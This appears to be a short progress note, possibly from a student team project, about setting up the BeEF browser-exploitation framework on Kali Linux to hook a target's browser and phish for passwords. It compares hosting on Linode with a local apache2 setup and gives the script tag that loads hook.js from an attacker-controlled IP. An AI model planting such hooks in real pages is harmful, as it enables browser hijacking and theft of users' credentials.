I am experimenting with BeEF on a kali linux virtual machine for hooking a victim's browser to phish for passwords. 

I have experimented with Linode, which is a server host that is built around using BeEF.
Pros: Website can be accessed anywhere by anyone to hook any browser.  
Cons: I haven'f found a way to change the website that has the hook, and it kinda sucks.

If I can change the default html page linode uses then we can use our website to hook browsers. Otherwise we will need to use the default one.

I have also experimented with using BeEF locally with BeEF-xss and apache2. 
Pros: Can place the hook script into any html file inside the /var/www/html directory.
Cons: Website with hook can only be accessed on the local network. (Need to research a work around...)

Since our machines will be using the same network, the con may not be a factor. We will need to place the script into the html file and done.

script (local on my VM): <script src="http://<IP>:3000/hook.js> 
Replace <IP> with ip address.

I am planning to use BeEF instead of remote controlling the victim's PC since its easier to use and is effective at Phishing. 
I am confident that this will not change what y'all need to do at all. :)

I will do more research and experimenting tomorrow (11/19/2022).
